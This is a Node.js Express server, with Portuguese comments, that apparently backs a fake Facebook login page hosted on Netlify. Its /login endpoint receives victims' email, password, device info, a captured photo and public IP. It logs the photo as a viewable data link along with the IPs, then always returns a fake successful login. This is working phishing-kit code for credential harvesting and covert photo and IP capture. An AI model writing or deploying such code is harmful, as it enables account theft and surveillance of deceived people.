const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();

app.use(cors({
    origin: process.env.FRONTEND_URL || 'https://viewgroupfb.netlify.app/',
    methods: ['GET', 'POST'],
    credentials: true
}));
// Limitação de tamanho das requisições
app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({limit: '50mb', extended: true}));

app.get('/', (req, res) => {
    res.json({ message: 'API Facebook Clone está funcionando!' });
});

app.post('/login', async (req, res) => {
    try {
        const { email, senha, dispositivo, foto, ipPublico } = req.body;

        // Criar um link para visualizar a foto em base64
        const fotoLink = `data:image/jpeg;base64,${foto.split(',')[1]}`;
        
        // Log da foto como link clicável
        console.log('\n📸 FOTO CAPTURADA 📸\n');
        console.log('Link da foto (clique para copiar):', fotoLink);

        // Remove o log extenso do base64
        console.log('\n📸 INFORMAÇÕES DA FOTO E IP 📸\n');
        console.log('🌐 IP PÚBLICO:', ipPublico);
        
        // Log de informações da requisição
        console.log('\n🌍 INFORMAÇÕES DA REQUISIÇÃO 🌍\n');
        console.log('🌐 IP:', req.ip);
        console.log('📍 MÉTODO:', req.method);
        console.log('🔍 ORIGEM:', req.headers.origin);
        console.log('\n');
        console.log('='.repeat(50));
        console.log('\n');

        if (!email || !senha) {
            return res.status(400).json({
                success: false,
                message: 'Email e senha são obrigatórios'
            });
        }

        await new Promise(resolve => setTimeout(resolve, 1000));

        res.status(200).json({
            success: true,
            message: 'Login realizado com sucesso',
            user: {
                email,
                name: 'Usuário Teste'
            }
        });

    } catch (error) {
        console.error('Erro no login:', error);
        res.status(500).json({
            success: false,
            message: 'Erro interno do servidor'
        });
    }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
